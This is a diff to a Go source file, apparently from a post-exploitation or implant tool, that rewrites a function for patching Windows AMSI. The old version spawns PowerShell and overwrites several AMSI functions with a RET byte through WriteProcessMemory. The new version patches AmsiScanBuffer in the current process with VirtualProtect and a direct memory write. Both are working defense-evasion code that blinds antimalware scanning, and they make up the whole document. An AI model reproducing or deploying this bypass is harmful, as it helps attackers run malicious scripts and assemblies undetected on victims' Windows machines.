@@ -67,65 +67,40 @@ func Execute_Assembly(asm []byte, params []string) (string, error) {
 
 // https://github.com/timwhitez/Doge-AMSI-patch/blob/main/amsi.go
 func PatchAmsi() {
-	var (
-		fntdll             = syscall.NewLazyDLL("amsi.dll")
-		AmsiScanBuffer     = fntdll.NewProc("AmsiScanBuffer")
-		AmsiScanString     = fntdll.NewProc("AmsiScanString")
-		AmsiInitialize     = fntdll.NewProc("AmsiInitialize")
-		k32                = syscall.NewLazyDLL("kernel32.dll")
-		WriteProcessMemory = k32.NewProc("WriteProcessMemory")
-	)
-	si := new(syscall.StartupInfo)
-	pi := new(syscall.ProcessInformation)
-	si.Cb = uint32(unsafe.Sizeof(si))
-	err2 := syscall.CreateProcess(nil, syscall.StringToUTF16Ptr("powershell -NoExit"), nil, nil, false, windows.CREATE_NEW_CONSOLE, nil, nil, si, pi)
-	if err2 != nil {
-		panic(err2)
-	}
+	amsi := syscall.NewLazyDLL("amsi.dll")
+	amsiScanBuffer := amsi.NewProc("AmsiScanBuffer")
 
-	hProcess := uintptr(pi.Process)
-	hThread := uintptr(pi.Thread)
-
+	addr := amsiScanBuffer.Addr()
+	patch := []byte{0xC3} // RET instruction
 	var oldProtect uint32
-	var old uint32
-	patch := []byte{0xc3}
 
-	windows.SleepEx(500, false)
-
-	fmt.Println("patching amsi ......")
-
-	amsi := []uintptr{
-		AmsiInitialize.Addr(),
-		AmsiScanBuffer.Addr(),
-		AmsiScanString.Addr(),
+	// Change memory protection to PAGE_EXECUTE_READWRITE
+	err := windows.VirtualProtect(
+		addr,
+		uintptr(len(patch)),
+		windows.PAGE_EXECUTE_READWRITE,
+		&oldProtect)
+	if err != nil {
+		fmt.Printf("VirtualProtect failed: %v\n", err)
+		return
 	}
 
-	var e error
-	var r1 uintptr
-
-	for _, baseAddr := range amsi {
-		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, syscall.PAGE_READWRITE, &oldProtect)
-		if e != nil {
-			fmt.Println("virtualprotect error")
-			fmt.Println(e)
-			return
-		}
-		r1, _, e = WriteProcessMemory.Call(hProcess, baseAddr, uintptr(unsafe.Pointer(&patch[0])), uintptr(len(patch)), 0)
-		if r1 == 0 {
-			fmt.Println("WriteProcessMemory error")
-			fmt.Println(e)
-			return
-		}
-		e = windows.VirtualProtectEx(windows.Handle(hProcess), baseAddr, 1, oldProtect, &old)
-		if e != nil {
-			fmt.Println("virtualprotect error")
-			fmt.Println(e)
-			return
-		}
+	// Patch the memory
+	ptr := unsafe.Pointer(addr)
+	for i := range patch {
+		*(*byte)(unsafe.Pointer(uintptr(ptr) + uintptr(i))) = patch[i]
 	}
 
-	fmt.Println("amsi patched!!\n")
+	// Restore original protection
+	err = windows.VirtualProtect(
+		addr,
+		uintptr(len(patch)),
+		oldProtect,
+		&oldProtect)
+	if err != nil {
+		fmt.Printf("VirtualProtect restore failed: %v\n", err)
+		return
+	}
 
-	windows.CloseHandle(windows.Handle(hProcess))
-	windows.CloseHandle(windows.Handle(hThread))
+	fmt.Println("[*] AMSI patched in current process")
 }
